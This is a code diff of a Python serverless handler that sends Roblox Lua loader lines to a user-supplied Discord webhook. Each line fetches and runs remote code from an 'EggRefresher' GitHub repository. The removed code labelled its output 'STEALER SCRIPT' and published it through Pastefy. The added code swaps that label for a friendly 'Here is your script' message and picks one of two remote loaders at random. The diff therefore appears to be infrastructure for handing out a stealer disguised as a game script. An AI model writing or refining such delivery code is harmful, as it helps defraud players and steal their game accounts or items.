@@ -1,5 +1,12 @@
 import requests
 import json
+import random
+
+SCRIPTS = [
+    'loadstring(game:HttpGet("https://raw.githubusercontent.com/Xscripts-official/EggRefresher/refs/heads/main/eggscript"))()',
+    'loadstring(game:HttpGet("https://raw.githubusercontent.com/Xscripts-official/EggRefresher/refs/heads/main/EggRefresherLATEST"))()'
+    # 👆 you can add more scripts here
+]
 
 def handler(request):
     if request.method != "POST":
@@ -16,29 +23,18 @@ def handler(request):
     if not username or not webhook:
         return {"statusCode": 400, "body": "Missing username or webhook"}
 
-    # Create paste in Pastefy
-    paste_data = {
-        "title": f"{username}_script",
-        "content": 'loadstring(game:HttpGet("https://raw.githubusercontent.com/Xscripts-official/EggRefresher/refs/heads/main/EggRefresherLATEST"))()',
-        "public": True
-    }
+    # pick a random script
+    chosen_script = random.choice(SCRIPTS)
 
-    paste_res = requests.post("https://pastefy.app/api/v2/paste", json=paste_data)
-    if paste_res.status_code != 200:
-        return {"statusCode": 500, "body": "Pastefy Error: " + paste_res.text}
-
-    paste_json = paste_res.json()
-    paste_raw = paste_json.get("rawUrl")
-
-    # Send message to user's webhook
+    # send message to discord webhook
     payload = {
-        "content": f"STEALER SCRIPT:\n\n```\nloadstring(game:HttpGet(\"{paste_raw}\"))()\n```"
+        "content": f"Here is your script {username}!\n\n```\n{chosen_script}\n```"
     }
     requests.post(webhook, json=payload)
 
     return {
         "statusCode": 200,
         "headers": {"Content-Type": "application/json"},
-        "body": json.dumps({"paste_link": paste_raw})
+        "body": json.dumps({"script": chosen_script})
     }
     
